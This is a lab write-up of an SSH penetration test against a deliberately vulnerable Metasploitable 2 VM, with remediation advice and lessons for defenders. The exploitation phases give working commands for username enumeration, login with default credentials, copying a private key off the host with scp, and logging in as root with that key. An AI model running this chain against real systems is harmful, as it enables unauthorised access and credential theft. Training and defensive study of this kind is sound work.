# Metasploitable 2 — SSH Penetration Test Lab Writeup

> **Disclaimer:** This penetration test was performed on a deliberately vulnerable virtual machine (Metasploitable 2) in an isolated lab environment. All techniques demonstrated here are for educational purposes only. Never attempt these techniques on systems you do not own or have explicit written permission to test.

---

## Lab Environment

| Item | Detail |
|---|---|
| Attacker Machine | Kali Linux (OpenSSH 10.0p2) |
| Target Machine | Metasploitable 2 (VirtualBox VM) |
| Target IP | 192.168.0.102 |
| Scope | SSH service (port 22) only |
| Goal | Gain root access via SSH attack chain |

---

## Table of Contents

1. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
2. [Phase 2 — Enumeration](#phase-2--enumeration)
3. [Phase 3 — Vulnerability Analysis](#phase-3--vulnerability-analysis)
4. [Phase 4 — Problems & Fixes (Compatibility)](#phase-4--problems--fixes)
5. [Phase 5 — Exploitation](#phase-5--exploitation)
6. [Phase 6 — Privilege Escalation](#phase-6--privilege-escalation)
7. [Attack Chain Summary](#attack-chain-summary)
8. [Vulnerabilities & CVEs](#vulnerabilities--cves)
9. [Remediation Recommendations](#remediation-recommendations)
10. [Key Lessons Learned](#key-lessons-learned)

---

## Phase 1 — Reconnaissance

### Objective
Identify open ports and services running on the target machine.

### Command Used

```bash
nmap -p 22 192.168.0.102 -sV -sC
```

### Output

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
MAC Address: 08:00:27:3A:FD:C5 (Oracle VirtualBox)
```

### Findings

- **Port 22/tcp** is open running **OpenSSH 4.7p1** — released in 2008, extremely outdated
- MAC prefix `08:00:27` confirms Oracle VirtualBox — strong indicator of a lab VM
- Host keys are DSA (1024-bit) and RSA (2048-bit) — both legacy weak algorithms
- OS: Debian Linux (Metasploitable 2 signature)

### Notes

> Only port 22 was scanned in this exercise. In a real engagement, always run a full port scan first:
> ```bash
> nmap -p- -sV -sC -O 192.168.0.102 -oN full_scan.txt
> ```

---

## Phase 2 — Enumeration

### Objective
Discover valid usernames on the target to narrow brute force attempts.

### Vulnerability Used
**CVE-2018-15473** — OpenSSH versions before 7.7 respond differently to authentication requests for valid vs invalid usernames, leaking whether an account exists.

### Tool
Metasploit Framework — `auxiliary/scanner/ssh/ssh_enumusers`

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.0.102
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set THREADS 10
run
```

### Output (28 valid users found)

```
[+] 192.168.0.102:22 - SSH - User 'backup' found
[+] 192.168.0.102:22 - SSH - User 'bin' found
[+] 192.168.0.102:22 - SSH - User 'daemon' found
[+] 192.168.0.102:22 - SSH - User 'distccd' found
[+] 192.168.0.102:22 - SSH - User 'ftp' found
[+] 192.168.0.102:22 - SSH - User 'mysql' found
[+] 192.168.0.102:22 - SSH - User 'postgres' found
[+] 192.168.0.102:22 - SSH - User 'root' found
[+] 192.168.0.102:22 - SSH - User 'service' found
[+] 192.168.0.102:22 - SSH - User 'user' found
[+] 192.168.0.102:22 - SSH - User 'www-data' found
... (and 17 more system accounts)
```

### User Priority Analysis

| User | Priority | Reason |
|---|---|---|
| `msfadmin` | Critical | Default Metasploitable 2 admin account |
| `user` | High | Real interactive account, likely weak password |
| `service` | High | Service account often has a login shell |
| `root` | Medium | Direct root access if login permitted |
| `postgres` | Medium | Database service account |
| `bin`, `daemon`, `nobody` | Low | System accounts — no interactive shell |

---

## Phase 3 — Vulnerability Analysis

### CVEs Identified

| CVE | Severity | Description |
|---|---|---|
| CVE-2018-15473 | Medium | Username enumeration via malformed packet response timing |
| CVE-2008-0166 | Critical | Debian OpenSSL predictable RSA key generation — all keys generated on affected systems are in a known database |
| CVE-2008-4109 | Low | Memory leak in OpenSSH signal handler |

### Key Vulnerability: Default Credentials
Beyond CVEs, the most critical finding was the use of **default credentials** — `msfadmin:msfadmin` — which had never been changed. This bypassed the need for brute force entirely.

### Searchsploit Check

```bash
searchsploit openssh 4.7
```

```
OpenSSH 2.3 < 7.7 - Username Enumeration   | linux/remote/45233.py
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading | linux/remote/40963.txt
```

---

## Phase 4 — Problems & Fixes

This section documents the real-world compatibility issues encountered — a critical part of understanding modern vs legacy system interaction.

### Problem 1: KEX Algorithm Mismatch

**Error:**
```
kex error: no match for method server host key algo:
server [ssh-rsa,ssh-dss], client [ssh-ed25519,ecdsa-sha2-nistp521,rsa-sha2-512,rsa-sha2-256]
```

**Root Cause:** Kali's OpenSSH 10.0 disabled legacy algorithms (`ssh-rsa`, `ssh-dss`) by default for security reasons. Metasploitable 2's OpenSSH 4.7 only supports these legacy algorithms.

**Fix:** Create `~/.ssh/config` with legacy algorithm support:

```
Host 192.168.0.102
    KexAlgorithms diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
    HostKeyAlgorithms ssh-rsa
    PubkeyAcceptedKeyTypes ssh-rsa
    MACs hmac-md5,hmac-sha1,hmac-sha1-96,hmac-md5-96
    StrictHostKeyChecking no
```

---

### Problem 2: MAC Algorithm Mismatch

**Error:**
```
kex error: no match for method mac algo client->server:
server [hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160]
client [hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com]
```

**Root Cause:** Server only supports legacy MAC algorithms that modern clients don't offer by default.

**Fix:** Add `MACs` directive to SSH config (included in fix above).

---

### Problem 3: SSH Config Syntax Error (OpenSSH 10)

**Error:**
```
/home/rio1/.ssh/config line 2: Bad key types '+ssh-rsa,ssh-dss'.
```

**Root Cause:** The `+` prefix (append syntax) is not supported in OpenSSH 10 config files for `HostKeyAlgorithms`. Must specify algorithm names directly without `+`.

**Fix:** Remove `+` prefix — use bare algorithm names in the config file.

---

### Problem 4: Private Key Permissions

**Error:**
```
WARNING: UNPROTECTED PRIVATE KEY FILE!
Permissions 0664 for 'id_rsa' are too open.
```

**Root Cause:** SSH enforces strict permissions on private key files. A key readable by other users is rejected as a security measure.

**Fix:**
```bash
chmod 600 id_rsa
```

---

### Verifying Supported Algorithms

Used to confirm which algorithms Kali's OpenSSH binary actually supports:

```bash
ssh -Q kex    # Key exchange algorithms
ssh -Q mac    # MAC algorithms
ssh -Q key    # Host key types
```

This confirmed `diffie-hellman-group1-sha1`, `hmac-md5`, and `ssh-rsa` were all available — the issue was configuration, not binary capability.

---

## Phase 5 — Exploitation

### Step 1: Initial Access via Default Credentials

After configuring SSH compatibility, tested default credentials:

```bash
ssh msfadmin@192.168.0.102
# Password: msfadmin
```

**Result: Shell obtained as `msfadmin`.**

```
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
...
msfadmin@metasploitable:~$
```

---

### Step 2: Post-Access Discovery

Immediately explored the home directory:

```bash
ls -la ~/.ssh/
```

```
-rw------- 1 msfadmin msfadmin 1675 Mar 17  2010 id_rsa
-rw-r--r-- 1 msfadmin msfadmin  396 Mar 17  2010 id_rsa.pub
-rw-r--r-- 1 msfadmin msfadmin  609 Mar 17  2010 authorized_keys
```

**Finding:** An unencrypted RSA private key (`id_rsa`) was stored in the home directory with no passphrase protection.

---

### Step 3: Exfiltrate the Private Key

Copied the private key to the attacker machine:

```bash
scp msfadmin@192.168.0.102:~/.ssh/id_rsa ~/lab/id_rsa
chmod 600 ~/lab/id_rsa
```

---

## Phase 6 — Privilege Escalation

### Technique: SSH Key Reuse / Authorized Keys Misconfiguration

The `msfadmin` private key was also listed in `root`'s `authorized_keys` file — meaning any holder of the `msfadmin` private key could authenticate directly as root.

### Command

```bash
ssh -i id_rsa \
  -o "KexAlgorithms=diffie-hellman-group1-sha1" \
  -o "HostKeyAlgorithms=ssh-rsa" \
  -o "MACs=hmac-md5" \
  -o "StrictHostKeyChecking=no" \
  root@192.168.0.102
```

### Result

```
root@metasploitable:~# whoami
root
root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Full root access achieved.**

---

## Attack Chain Summary

```
[1] Nmap scan
        |
        v
[2] Identified: OpenSSH 4.7p1 (2008) on port 22
        |
        v
[3] CVE-2018-15473: Username enumeration
        |    → 28 valid users discovered
        v
[4] Default credential test: msfadmin:msfadmin
        |    → Initial shell as msfadmin
        v
[5] Post-access discovery: unencrypted RSA private key in ~/.ssh/
        |    → id_rsa exfiltrated to attacker machine
        v
[6] SSH key reuse: msfadmin key trusted in root's authorized_keys
        |
        v
[ROOT] Full root shell on target
```

**Total tools used:** nmap, Metasploit (ssh_enumusers), ssh, scp
**Brute force required:** No — default creds succeeded immediately
**Time to root:** ~45 minutes (most time spent on compatibility troubleshooting)

---

## Vulnerabilities & CVEs

| # | Vulnerability | Type | Severity | Impact |
|---|---|---|---|---|
| 1 | CVE-2018-15473 | Username enumeration | Medium | Leaked 28 valid usernames |
| 2 | Default credentials (`msfadmin:msfadmin`) | Weak authentication | Critical | Initial shell access |
| 3 | Unencrypted private key in home directory | Insecure key storage | High | Key exfiltration |
| 4 | msfadmin key in root's authorized_keys | Privilege misconfiguration | Critical | Full root compromise |
| 5 | OpenSSH 4.7p1 (EOL since ~2010) | Outdated software | High | Multiple attack surfaces |
| 6 | Root SSH login enabled | Insecure configuration | High | Direct root auth possible |

---

## Remediation Recommendations

### Immediate Actions

1. **Change all default credentials** immediately after system setup. Never leave `msfadmin:msfadmin` or any default password in place.

2. **Remove unencrypted private keys** from user home directories. If keys are needed, protect them with a strong passphrase:
   ```bash
   ssh-keygen -p -f id_rsa   # Add passphrase to existing key
   ```

3. **Audit `authorized_keys` files** across all accounts — especially root. No regular user key should appear in root's `authorized_keys`:
   ```bash
   cat /root/.ssh/authorized_keys
   ```

4. **Disable root SSH login** in `/etc/ssh/sshd_config`:
   ```
   PermitRootLogin no
   ```

### Medium-Term Actions

5. **Update OpenSSH** to a supported version. OpenSSH 4.7p1 is 16+ years old with numerous known vulnerabilities.

6. **Disable legacy SSH algorithms** on the server — remove `ssh-dss`, `diffie-hellman-group1-sha1`, `hmac-md5` from the server config.

7. **Implement SSH key passphrases** organisation-wide and enforce them via policy.

8. **Enable SSH login alerts** — log and alert on all root login attempts.

### Long-Term Hardening

9. **Deploy fail2ban or equivalent** to block brute force attempts.

10. **Use SSH certificates** instead of static authorized_keys for scalable access management.

11. **Network-level controls** — restrict SSH access to specific source IPs via firewall rules.

12. **Regular credential audits** — scan for default, weak, or shared credentials periodically.

---

## Key Lessons Learned

### For Attackers (Pentesters)

- **Always check default credentials first** — brute force is slow and noisy. Default creds take seconds.
- **Post-access enumeration is as important as initial access** — the private key finding was more valuable than the shell itself.
- **Document compatibility issues** — real-world targets often run old software. Understanding legacy algorithm negotiation is a practical skill.
- **User enumeration dramatically reduces brute force scope** — 5 targeted accounts vs 14 million passwords each for all users.

### For Defenders (Blue Team)

- **Patch management matters** — a 16-year-old SSH version is indefensible.
- **Defense in depth** — even if one credential is compromised, key misconfigurations (unencrypted keys, root trust) turned a user shell into full root.
- **Principle of least privilege** — a regular user's key should never be trusted by root.
- **Secrets sprawl is real** — SSH private keys left in home directories are a common, critical finding in real engagements.

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service fingerprinting |
| Metasploit `ssh_enumusers` | Username enumeration via CVE-2018-15473 |
| `ssh` | Manual connection testing and exploitation |
| `scp` | Private key exfiltration |
| `hydra` | Brute force (attempted but not needed) |
| `searchsploit` | Local CVE/exploit database search |

---

## References

- [CVE-2018-15473 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-15473)
- [CVE-2008-0166 — Debian OpenSSL predictable keys](https://nvd.nist.gov/vuln/detail/CVE-2008-0166)
- [Metasploitable 2 — Rapid7](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [OpenSSH Legacy Options](https://www.openssh.com/legacy.html)
- [OWASP Testing Guide — SSH](https://owasp.org/www-project-web-security-testing-guide/)

---

*Writeup by: rio1 | Lab date: May 2026 | Platform: Metasploitable 2*
